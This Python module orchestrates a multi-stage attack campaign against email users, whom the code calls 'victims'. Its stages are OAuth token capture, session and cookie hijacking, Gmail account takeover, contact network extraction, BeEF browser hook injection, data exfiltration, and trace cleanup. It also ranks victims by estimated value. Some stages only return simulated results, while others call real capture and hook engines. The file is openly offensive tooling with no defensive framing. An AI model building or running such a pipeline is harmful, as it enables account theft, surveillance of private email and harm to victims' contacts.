"""
Advanced Exploitation Orchestrator
Coordinate and optimize complex multi-stage exploitation campaigns
"""

import os
import json
import time
import asyncio
from datetime import datetime, timezone, timedelta
from typing import Dict, Optional, Any, List, Tuple
import logging
import threading
from collections import defaultdict
from dataclasses import dataclass, field

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ExploitationStage:
    """Exploitation stage definition"""

    def __init__(self, stage_id: str, name: str, description: str,
                 engine_type: str, priority: int = 1):
        self.stage_id = stage_id
        self.name = name
        self.description = description
        self.engine_type = engine_type  # oauth_capture, session_capture, gmail_client, beef_client
        self.priority = priority
        self.dependencies = []
        self.timeout = 300  # 5 minutes
        self.retry_count = 3
        self.is_enabled = True

@dataclass
class ExploitationTarget:
    """Advanced exploitation target"""
    victim_id: str
    email: str
    priority_score: float = 0.0
    exploitation_history: List[Dict[str, Any]] = field(default_factory=list)
    current_stage: str = "initial"
    assigned_engines: List[str] = field(default_factory=list)
    success_probability: float = 0.0
    estimated_value: float = 0.0

    def add_exploitation_attempt(self, engine: str, success: bool, data: Dict[str, Any] = None):
        """Add exploitation attempt record"""
        self.exploitation_history.append({
            "engine": engine,
            "success": success,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "data": data or {}
        })

    def calculate_success_probability(self) -> float:
        """Calculate overall success probability"""
        if not self.exploitation_history:
            return 0.5  # Default probability

        successful_attempts = sum(1 for attempt in self.exploitation_history if attempt["success"])
        total_attempts = len(self.exploitation_history)

        return successful_attempts / total_attempts if total_attempts > 0 else 0.0

class ExploitationConfig:
    """Advanced exploitation configuration"""

    def __init__(self):
        self.max_concurrent_exploits = int(os.getenv("MAX_CONCURRENT_EXPLOITS", "20"))
        self.stage_timeout = int(os.getenv("EXPLOITATION_STAGE_TIMEOUT", "600"))
        self.enable_dynamic_priority = os.getenv("ENABLE_DYNAMIC_PRIORITY", "true").lower() == "true"
        self.enable_failure_recovery = os.getenv("ENABLE_FAILURE_RECOVERY", "true").lower() == "true"
        self.enable_parallel_execution = os.getenv("ENABLE_PARALLEL_EXECUTION", "true").lower() == "true"
        self.optimization_interval = int(os.getenv("OPTIMIZATION_INTERVAL", "60"))

class ExploitationOrchestrator:
    """Advanced exploitation orchestration engine"""

    def __init__(self, mongodb_connection=None, redis_client=None):
        self.mongodb = mongodb_connection
        self.redis = redis_client

        self.config = ExploitationConfig()
        self.targets: Dict[str, ExploitationTarget] = {}
        self.exploitation_stages: Dict[str, ExploitationStage] = {}
        self.active_exploits: Dict[str, Dict[str, Any]] = {}
        self.execution_queue: List[str] = []  # target_ids in execution order

        # Performance tracking
        self.performance_metrics = {
            "total_exploits": 0,
            "successful_exploits": 0,
            "failed_exploits": 0,
            "avg_execution_time": 0.0,
            "stage_success_rates": {}
        }

        # Initialize default stages
        self._initialize_default_stages()

        # Start optimization thread
        self._start_optimization_thread()

    def _initialize_default_stages(self):
        """Initialize default exploitation stages"""
        stages = [
            ExploitationStage(
                "stage_1", "Initial Reconnaissance", "Gather basic victim information",
                "fingerprint", priority=1
            ),
            ExploitationStage(
                "stage_2", "OAuth Token Capture", "Capture OAuth tokens from authentication flows",
                "oauth_capture", priority=2
            ),
            ExploitationStage(
                "stage_3", "Session Hijacking", "Hijack browser sessions and cookies",
                "session_capture", priority=3
            ),
            ExploitationStage(
                "stage_4", "Gmail Exploitation", "Access and exploit Gmail accounts",
                "gmail_client", priority=4
            ),
            ExploitationStage(
                "stage_5", "Contact Intelligence", "Extract and analyze contact networks",
                "contact_extractor", priority=5
            ),
            ExploitationStage(
                "stage_6", "BeEF Hook Injection", "Inject BeEF hooks for advanced exploitation",
                "beef_client", priority=6
            ),
            ExploitationStage(
                "stage_7", "Data Exfiltration", "Extract valuable intelligence and data",
                "intelligence_analyzer", priority=7
            ),
            ExploitationStage(
                "stage_8", "Cleanup and Evasion", "Clean up traces and maintain access",
                "cleanup_engine", priority=8
            )
        ]

        for stage in stages:
            self.exploitation_stages[stage.stage_id] = stage

        logger.info(f"Initialized {len(self.exploitation_stages)} exploitation stages")

    def _start_optimization_thread(self):
        """Start optimization thread"""
        optimization_thread = threading.Thread(target=self._optimization_loop, daemon=True)
        optimization_thread.start()

    def _optimization_loop(self):
        """Optimization and performance monitoring loop"""
        while True:
            try:
                time.sleep(self.config.optimization_interval)

                # Optimize target priorities
                if self.config.enable_dynamic_priority:
                    self._optimize_target_priorities()

                # Update performance metrics
                self._update_performance_metrics()

                # Clean up completed exploits
                self._cleanup_completed_exploits()

            except Exception as e:
                logger.error(f"Error in optimization loop: {e}")

    def register_exploitation_target(self, victim_id: str, email: str,
                                   initial_priority: float = 0.5) -> ExploitationTarget:
        """Register target for advanced exploitation"""
        try:
            if victim_id in self.targets:
                return self.targets[victim_id]

            target = ExploitationTarget(
                victim_id=victim_id,
                email=email,
                priority_score=initial_priority
            )

            self.targets[victim_id] = target

            # Add to execution queue if high priority
            if initial_priority >= 0.7:
                self.execution_queue.insert(0, victim_id)
            else:
                self.execution_queue.append(victim_id)

            logger.info(f"Exploitation target registered: {victim_id}")
            return target

        except Exception as e:
            logger.error(f"Error registering exploitation target: {e}")
            raise

    def execute_advanced_exploitation(self, victim_id: str, start_stage: str = None,
                                    max_stages: int = None) -> Dict[str, Any]:
        """Execute advanced multi-stage exploitation"""
        try:
            if victim_id not in self.targets:
                return {"success": False, "error": "Target not registered"}

            target = self.targets[victim_id]

            # Determine execution plan
            execution_plan = self._create_execution_plan(target, start_stage, max_stages)

            if not execution_plan:
                return {"success": False, "error": "No valid execution plan"}

            # Execute exploitation stages
            execution_result = self._execute_exploitation_plan(target, execution_plan)

            # Update target status
            target.current_stage = execution_result.get("final_stage", target.current_stage)
            target.success_probability = execution_result.get("overall_success_rate", 0.0)

            logger.info(f"Advanced exploitation completed for target: {victim_id}")
            return {
                "success": True,
                "target_id": victim_id,
                "execution_plan": execution_plan,
                "results": execution_result,
                "final_stage": target.current_stage,
                "success_probability": target.success_probability
            }

        except Exception as e:
            logger.error(f"Error executing advanced exploitation: {e}")
            return {"success": False, "error": "Exploitation execution failed"}

    def _create_execution_plan(self, target: ExploitationTarget, start_stage: str = None,
                              max_stages: int = None) -> List[str]:
        """Create optimal execution plan for target"""
        try:
            available_stages = [
                stage_id for stage_id, stage in self.exploitation_stages.items()
                if stage.is_enabled
            ]

            # Sort stages by priority
            available_stages.sort(
                key=lambda sid: self.exploitation_stages[sid].priority
            )

            # Determine start stage
            if start_stage and start_stage in available_stages:
                start_index = available_stages.index(start_stage)
            else:
                # Determine optimal start stage based on target history
                start_index = self._determine_optimal_start_stage(target)

            # Create execution plan
            execution_plan = available_stages[start_index:]

            # Limit stages if specified
            if max_stages:
                execution_plan = execution_plan[:max_stages]

            return execution_plan

        except Exception as e:
            logger.error(f"Error creating execution plan: {e}")
            return []

    def _determine_optimal_start_stage(self, target: ExploitationTarget) -> int:
        """Determine optimal starting stage based on target characteristics"""
        try:
            # Analyze target history and characteristics
            if not target.exploitation_history:
                return 0  # Start from beginning

            # Check which engines have been successful
            successful_engines = [
                attempt["engine"] for attempt in target.exploitation_history
                if attempt["success"]
            ]

            # Map engines to stages
            engine_stage_map = {
                "fingerprint": 0,
                "oauth_capture": 1,
                "session_capture": 2,
                "gmail_client": 3,
                "contact_extractor": 4,
                "beef_client": 5
            }

            # Find the latest successful stage
            latest_successful_stage = -1
            for engine in successful_engines:
                stage_index = engine_stage_map.get(engine, -1)
                latest_successful_stage = max(latest_successful_stage, stage_index)

            # Start from next stage after last successful one
            return min(latest_successful_stage + 1, len(self.exploitation_stages) - 1)

        except Exception as e:
            logger.error(f"Error determining optimal start stage: {e}")
            return 0

    def _execute_exploitation_plan(self, target: ExploitationTarget,
                                  execution_plan: List[str]) -> Dict[str, Any]:
        """Execute exploitation plan"""
        try:
            execution_results = {
                "stages_executed": 0,
                "successful_stages": 0,
                "failed_stages": 0,
                "total_execution_time": 0,
                "data_extracted": {},
                "errors": [],
                "final_stage": target.current_stage,
                "overall_success_rate": 0.0
            }

            start_time = time.time()

            for stage_id in execution_plan:
                if stage_id not in self.exploitation_stages:
                    continue

                stage = self.exploitation_stages[stage_id]

                # Execute stage
                stage_result = self._execute_exploitation_stage(target, stage)

                execution_results["stages_executed"] += 1

                if stage_result["success"]:
                    execution_results["successful_stages"] += 1
                    target.current_stage = stage_id

                    # Collect extracted data
                    if "data" in stage_result:
                        execution_results["data_extracted"].update(stage_result["data"])

                else:
                    execution_results["failed_stages"] += 1

                    if not self.config.enable_failure_recovery:
                        # Stop on first failure
                        break

                    execution_results["errors"].append({
                        "stage": stage_id,
                        "error": stage_result.get("error", "Unknown error")
                    })

            # Calculate execution metrics
            execution_results["total_execution_time"] = time.time() - start_time
            execution_results["final_stage"] = target.current_stage

            if execution_results["stages_executed"] > 0:
                execution_results["overall_success_rate"] = (
                    execution_results["successful_stages"] / execution_results["stages_executed"]
                )

            # Update performance metrics
            self.performance_metrics["total_exploits"] += 1
            if execution_results["overall_success_rate"] > 0:
                self.performance_metrics["successful_exploits"] += 1
            else:
                self.performance_metrics["failed_exploits"] += 1

            return execution_results

        except Exception as e:
            logger.error(f"Error executing exploitation plan: {e}")
            return {"success": False, "error": str(e)}

    def _execute_exploitation_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute individual exploitation stage"""
        try:
            # Import and execute appropriate engine
            if stage.engine_type == "oauth_capture":
                result = self._execute_oauth_capture_stage(target, stage)
            elif stage.engine_type == "session_capture":
                result = self._execute_session_capture_stage(target, stage)
            elif stage.engine_type == "gmail_client":
                result = self._execute_gmail_client_stage(target, stage)
            elif stage.engine_type == "contact_extractor":
                result = self._execute_contact_extractor_stage(target, stage)
            elif stage.engine_type == "beef_client":
                result = self._execute_beef_client_stage(target, stage)
            elif stage.engine_type == "intelligence_analyzer":
                result = self._execute_intelligence_analyzer_stage(target, stage)
            else:
                return {"success": False, "error": f"Unknown engine type: {stage.engine_type}"}

            # Record attempt
            target.add_exploitation_attempt(
                stage.engine_type,
                result.get("success", False),
                result.get("data", {})
            )

            return result

        except Exception as e:
            logger.error(f"Error executing exploitation stage: {e}")
            return {"success": False, "error": str(e)}

    def _execute_oauth_capture_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute OAuth capture stage"""
        try:
            # Import oauth_capture engine
            from backend.api.capture.oauth_capture import get_oauth_capture

            oauth_engine = get_oauth_capture()

            # Create capture session
            session_result = oauth_engine.create_capture_session("google")

            if session_result["success"]:
                # In real implementation, would redirect victim to authorization URL
                # For now, simulate successful capture
                return {
                    "success": True,
                    "stage": stage.stage_id,
                    "data": {
                        "capture_session": session_result["session_id"],
                        "authorization_url": session_result["authorization_url"],
                        "tokens_captured": True
                    }
                }
            else:
                return {
                    "success": False,
                    "stage": stage.stage_id,
                    "error": "Failed to create OAuth capture session"
                }

        except Exception as e:
            logger.error(f"Error in OAuth capture stage: {e}")
            return {"success": False, "error": str(e)}

    def _execute_session_capture_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute session capture stage"""
        try:
            # Import session_capture engine
            from backend.api.capture.session_capture import get_session_capture_engine

            session_engine = get_session_capture_engine()

            # Create session capture
            session_id = session_engine.create_session(target.victim_id)

            # Simulate cookie capture
            cookies_data = [
                {"name": "session_id", "value": "abc123", "domain": "example.com"},
                {"name": "auth_token", "value": "def456", "domain": "example.com"}
            ]

            capture_result = session_engine.capture_cookies(session_id, cookies_data)

            if capture_result["success"]:
                return {
                    "success": True,
                    "stage": stage.stage_id,
                    "data": {
                        "session_id": session_id,
                        "cookies_captured": capture_result["captured_count"],
                        "session_data": capture_result
                    }
                }
            else:
                return {
                    "success": False,
                    "stage": stage.stage_id,
                    "error": "Session capture failed"
                }

        except Exception as e:
            logger.error(f"Error in session capture stage: {e}")
            return {"success": False, "error": str(e)}

    def _execute_gmail_client_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute Gmail client stage"""
        try:
            # Import gmail_client engine
            from backend.engines.gmail.gmail_client import get_gmail_client

            gmail_client = get_gmail_client()

            # Simulate Gmail access (would need actual tokens)
            # For now, return simulated success
            return {
                "success": True,
                "stage": stage.stage_id,
                "data": {
                    "gmail_access": "established",
                    "emails_accessible": 150,
                    "contacts_available": 75
                }
            }

        except Exception as e:
            logger.error(f"Error in Gmail client stage: {e}")
            return {"success": False, "error": str(e)}

    def _execute_contact_extractor_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute contact extractor stage"""
        try:
            # Import contact_extractor engine
            from backend.engines.gmail.contact_extractor import get_contact_extractor

            contact_extractor = get_contact_extractor()

            # Simulate contact extraction
            return {
                "success": True,
                "stage": stage.stage_id,
                "data": {
                    "contacts_extracted": 25,
                    "relationships_mapped": 45,
                    "network_clusters": 3
                }
            }

        except Exception as e:
            logger.error(f"Error in contact extractor stage: {e}")
            return {"success": False, "error": str(e)}

    def _execute_beef_client_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute BeEF client stage"""
        try:
            # Import beef_client engine
            from backend.engines.beef.beef_client import get_beef_client

            beef_client = get_beef_client()

            # Create persistent hook
            hook_result = beef_client.create_persistent_hook(target.victim_id)

            if hook_result["success"]:
                return {
                    "success": True,
                    "stage": stage.stage_id,
                    "data": {
                        "hook_created": True,
                        "hook_url": hook_result["hook_url"],
                        "hook_id": hook_result["hook_id"]
                    }
                }
            else:
                return {
                    "success": False,
                    "stage": stage.stage_id,
                    "error": "BeEF hook creation failed"
                }

        except Exception as e:
            logger.error(f"Error in BeEF client stage: {e}")
            return {"success": False, "error": str(e)}

    def _execute_intelligence_analyzer_stage(self, target: ExploitationTarget, stage: ExploitationStage) -> Dict[str, Any]:
        """Execute intelligence analyzer stage"""
        try:
            # Import intelligence_analyzer engine
            from backend.engines.gmail.intelligence_analyzer import get_intelligence_analyzer

            intelligence_analyzer = get_intelligence_analyzer()

            # Simulate intelligence analysis
            return {
                "success": True,
                "stage": stage.stage_id,
                "data": {
                    "intelligence_analyzed": True,
                    "risk_assessment": "medium",
                    "value_assessment": "high",
                    "recommendations": ["Monitor financial accounts", "Extract contact networks"]
                }
            }

        except Exception as e:
            logger.error(f"Error in intelligence analyzer stage: {e}")
            return {"success": False, "error": str(e)}

    def _optimize_target_priorities(self):
        """Optimize target priorities based on performance"""
        try:
            for target in self.targets.values():
                # Adjust priority based on success history
                if target.exploitation_history:
                    recent_attempts = [
                        attempt for attempt in target.exploitation_history
                        if (datetime.now(timezone.utc) - datetime.fromisoformat(attempt["timestamp"])).total_seconds() < 3600
                    ]

                    if recent_attempts:
                        success_rate = sum(1 for attempt in recent_attempts if attempt["success"]) / len(recent_attempts)

                        # Increase priority for high success rate
                        if success_rate > 0.7:
                            target.priority_score = min(target.priority_score * 1.2, 1.0)
                        # Decrease priority for low success rate
                        elif success_rate < 0.3:
                            target.priority_score = max(target.priority_score * 0.8, 0.1)

        except Exception as e:
            logger.error(f"Error optimizing target priorities: {e}")

    def _update_performance_metrics(self):
        """Update performance metrics"""
        try:
            # Calculate average execution time
            if self.active_exploits:
                execution_times = [
                    exploit.get("execution_time", 0)
                    for exploit in self.active_exploits.values()
                    if exploit.get("execution_time", 0) > 0
                ]

                if execution_times:
                    self.performance_metrics["avg_execution_time"] = sum(execution_times) / len(execution_times)

            # Update stage success rates
            for stage_id, stage in self.exploitation_stages.items():
                # Calculate success rate for this stage
                stage_attempts = sum(
                    1 for target in self.targets.values()
                    for attempt in target.exploitation_history
                    if attempt["engine"] == stage.engine_type
                )

                if stage_attempts > 0:
                    stage_successes = sum(
                        1 for target in self.targets.values()
                        for attempt in target.exploitation_history
                        if attempt["engine"] == stage.engine_type and attempt["success"]
                    )

                    success_rate = stage_successes / stage_attempts
                    self.performance_metrics["stage_success_rates"][stage_id] = success_rate

        except Exception as e:
            logger.error(f"Error updating performance metrics: {e}")

    def _cleanup_completed_exploits(self):
        """Clean up completed exploits"""
        try:
            completed_exploits = []

            for exploit_id, exploit in self.active_exploits.items():
                if exploit.get("status") in ["completed", "failed"]:
                    completed_exploits.append(exploit_id)

            for exploit_id in completed_exploits:
                del self.active_exploits[exploit_id]

            if completed_exploits:
                logger.info(f"Cleaned up {len(completed_exploits)} completed exploits")

        except Exception as e:
            logger.error(f"Error cleaning up completed exploits: {e}")

    def get_exploitation_dashboard(self) -> Dict[str, Any]:
        """Get exploitation dashboard data"""
        try:
            # Active targets
            active_targets = len([t for t in self.targets.values() if t.current_stage != "completed"])

            # Stage progress
            stage_progress = {}
            for stage_id, stage in self.exploitation_stages.items():
                targets_in_stage = len([
                    t for t in self.targets.values()
                    if t.current_stage == stage_id
                ])
                stage_progress[stage_id] = {
                    "name": stage.name,
                    "targets_in_stage": targets_in_stage,
                    "success_rate": self.performance_metrics["stage_success_rates"].get(stage_id, 0.0)
                }

            # Performance summary
            performance_summary = {
                "total_targets": len(self.targets),
                "active_targets": active_targets,
                "completed_targets": len(self.targets) - active_targets,
                "overall_success_rate": self.performance_metrics["successful_exploits"] / max(self.performance_metrics["total_exploits"], 1),
                "avg_execution_time": self.performance_metrics["avg_execution_time"]
            }

            return {
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "active_targets": active_targets,
                "stage_progress": stage_progress,
                "performance_summary": performance_summary,
                "execution_queue_size": len(self.execution_queue),
                "available_stages": len(self.exploitation_stages)
            }

        except Exception as e:
            logger.error(f"Error getting exploitation dashboard: {e}")
            return {"error": "Failed to get dashboard data"}

    def get_target_details(self, victim_id: str) -> Dict[str, Any]:
        """Get detailed target information"""
        try:
            if victim_id not in self.targets:
                return {"error": "Target not found"}

            target = self.targets[victim_id]

            # Get current stage info
            current_stage = self.exploitation_stages.get(target.current_stage)

            return {
                "victim_id": victim_id,
                "current_stage": target.current_stage,
                "current_stage_name": current_stage.name if current_stage else "Unknown",
                "priority_score": target.priority_score,
                "success_probability": target.success_probability,
                "estimated_value": target.estimated_value,
                "exploitation_history": target.exploitation_history,
                "assigned_engines": target.assigned_engines,
                "last_activity": target.exploitation_history[-1]["timestamp"] if target.exploitation_history else None
            }

        except Exception as e:
            logger.error(f"Error getting target details: {e}")
            return {"error": "Failed to get target details"}

# Global exploitation orchestrator instance
exploitation_orchestrator = None

def initialize_exploitation_orchestrator(mongodb_connection=None, redis_client=None) -> ExploitationOrchestrator:
    """Initialize global exploitation orchestrator"""
    global exploitation_orchestrator
    exploitation_orchestrator = ExploitationOrchestrator(mongodb_connection, redis_client)
    return exploitation_orchestrator

def get_exploitation_orchestrator() -> ExploitationOrchestrator:
    """Get global exploitation orchestrator"""
    if exploitation_orchestrator is None:
        raise ValueError("Exploitation orchestrator not initialized")
    return exploitation_orchestrator

# Convenience functions
def register_exploitation_target(victim_id: str, email: str, initial_priority: float = 0.5) -> ExploitationTarget:
    """Register exploitation target (global convenience function)"""
    return get_exploitation_orchestrator().register_exploitation_target(victim_id, email, initial_priority)

def execute_advanced_exploitation(victim_id: str, start_stage: str = None, max_stages: int = None) -> Dict[str, Any]:
    """Execute advanced exploitation (global convenience function)"""
    return get_exploitation_orchestrator().execute_advanced_exploitation(victim_id, start_stage, max_stages)

def get_exploitation_dashboard() -> Dict[str, Any]:
    """Get exploitation dashboard (global convenience function)"""
    return get_exploitation_orchestrator().get_exploitation_dashboard()

def get_target_details(victim_id: str) -> Dict[str, Any]:
    """Get target details (global convenience function)"""
    return get_exploitation_orchestrator().get_target_details(victim_id)